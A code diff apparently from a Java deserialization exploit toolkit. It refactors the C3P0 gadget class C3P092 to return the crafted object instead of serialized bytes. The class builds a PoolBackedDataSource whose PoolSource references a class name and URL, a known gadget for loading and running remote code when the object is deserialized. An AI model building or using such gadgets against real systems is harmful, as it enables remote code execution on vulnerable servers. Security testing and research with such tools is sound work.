@@ -25,7 +25,7 @@ import java.util.logging.Logger;
  */
 public class C3P092 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
@@ -53,20 +53,9 @@ public class C3P092 implements ObjectPayload<Object> {
 
         Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
         Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(b);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return b;
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
-    }
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
